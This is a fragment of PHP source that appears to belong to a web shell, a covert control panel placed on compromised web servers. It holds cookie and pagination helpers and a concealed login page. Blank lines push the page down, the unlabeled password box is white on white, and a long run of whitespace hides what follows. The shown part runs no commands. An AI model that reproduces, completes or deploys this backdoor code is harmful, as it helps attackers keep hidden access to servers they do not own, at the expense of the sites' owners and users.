function scookie($key, $value, $life = 0, $prefix = 1) {
  
    global $admin, $timestamp, $_SERVER;
  
    $key = ($prefix ? $admin['cookiepre'] : '').$key;
  
    $life = $life ? $life : $admin['cookielife'];
  
    $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
  
    setcookie($key, $value, $timestamp+$life, $admin['cookiepath'], $admin['cookiedomain'], $useport);
  
}
  
function multi($num, $perpage, $curpage, $tablename) {
  
    $multipage = '';
  
    if($num > $perpage) {
  
        $page = 10;
  
        $offset = 5;
  
        $pages = @ceil($num / $perpage);
  
        if($page > $pages) {
  
            $from = 1;
  
            $to = $pages;
  
        } else {
  
            $from = $curpage - $offset;
  
            $to = $curpage + $page - $offset - 1;
  
            if($from < 1) {
  
                $to = $curpage + 1 - $from;
  
                $from = 1;
  
                if(($to - $from) < $page && ($to - $from) < $pages) {
  
                    $to = $page;
  
                }
  
            } elseif($to > $pages) {
  
                $from = $curpage - $pages + $to;
  
                $to = $pages;
  
                if(($to - $from) < $page && ($to - $from) < $pages) {
  
                    $from = $pages - $page + 1;
  
                }
  
            }
  
        }
  
        $multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
  
        for($i = $from; $i <= $to; $i++) {
  
            $multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
  
        }
  
        $multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
  
        $multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
  
    }
  
    return $multipage;
  
}
  
// Login page
  
function loginpage() {
  
?>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
<html>
<head>
<style type="text/css">
 input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
</head>
<center>
<form method="POST" action="">
<span style="font:10pt tahoma;"></span><input name="password" type="password" size="20">
<input type="hidden" name="doing" value="login">
</form>
</center>
</html>
<?php
  
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
?>